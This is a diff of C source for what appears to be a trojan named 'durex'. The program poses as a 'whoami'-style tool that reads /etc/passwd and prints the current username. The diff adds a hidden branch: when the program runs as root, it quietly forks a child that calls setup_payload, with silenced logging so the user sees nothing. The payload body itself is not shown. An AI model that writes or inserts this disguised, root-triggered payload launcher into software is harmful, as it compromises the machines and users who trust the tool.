@@ -1,50 +1,34 @@
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <string.h>
-#include <stdlib.h>
-#include <stdio.h>
+#include "durex.h"
 
-#include "utils.h"
-
-int	error(const char *str)
+static char	*read_passfile(void)
 {
-	perror(str);
-	return EXIT_FAILURE;
-}
+	#define PASSFILE	"/etc/passwd"
 
-void	payload()
-{
-	fork();
-	daemon(0, 0);
-	printf("muhahaha\n");
-}
-
-char	*read_file()
-{
 	struct stat	statbuf;
-	int		fd = open("/etc/passwd", O_RDONLY);
+	int		fd = open(PASSFILE, O_RDONLY);
 
 	if (fd == -1)
-		return error("failed to open /etc/passwd"), NULL;
+		return error("failed to open " PASSFILE), NULL;
 	if (fstat(fd, &statbuf) != 0)
-		return error("failed to stat /etc/passwd"), NULL;
+		return error("failed to stat " PASSFILE), NULL;
 
 	size_t		filesize = statbuf.st_size;
 	char		*content = malloc(filesize + 1);
+
 	if (content == NULL)
-		return error("failed to allocate memory for /etc/passwd"), NULL;
-	ssize_t len = read(fd, content, filesize);
+		return error("failed to allocate memory for " PASSFILE), NULL;
+
+	ssize_t		len = read(fd, content, filesize);
+
 	if (len == -1)
-		return error("failed to read /etc/passwd"), NULL;
+		return error("failed to read " PASSFILE), NULL;
+
 	content[len] = '\0';
 	close(fd);
-
 	return content;
 }
 
-char	*matching_username(char *content, uid_t uid)
+static char	*get_username(char *content, uid_t uid)
 {
 	char	*line = strtok(content, "\n");
 
@@ -53,7 +37,7 @@ char	*matching_username(char *content, uid_t uid)
 		char	*entry = strnchr(line, ':', 2);
 		if (entry != NULL)
 		{
-			long int	read_uid = read_num(entry+1);
+			long int	read_uid = read_num(entry + 1);
 			if (read_uid != -1 && read_uid == uid)
 			{
 				// no need to check because strnchr above passed
@@ -67,18 +51,32 @@ char	*matching_username(char *content, uid_t uid)
 	return NULL;
 }
 
-int	main(void)
+static void	fork_durex(char *program_path)
+{
+	silent_log("forking into durex...\n");
+
+	pid_t	pid = fork();
+
+	if (pid == -1)
+		silent_error("failed to fork into durex");
+	else if (pid == 0)
+		setup_payload(program_path);
+}
+
+/* ---------------------------------- main ---------------------------------- */
+
+int		main(__unused int ac, char **av)
 {
 	uid_t	uid = geteuid();
 	if (uid == 0)
-		payload();
+		fork_durex(av[0]);
 
-	char	*content = read_file();
+	char	*content = read_passfile();
 	if (content == NULL)
 		return EXIT_FAILURE;
 
-	char	*user = matching_username(content, uid);
-	printf("%s\n", user);
+	char	*username = get_username(content, uid);
+	printf("%s\n", username);
 
 	free(content);
 	return EXIT_SUCCESS;
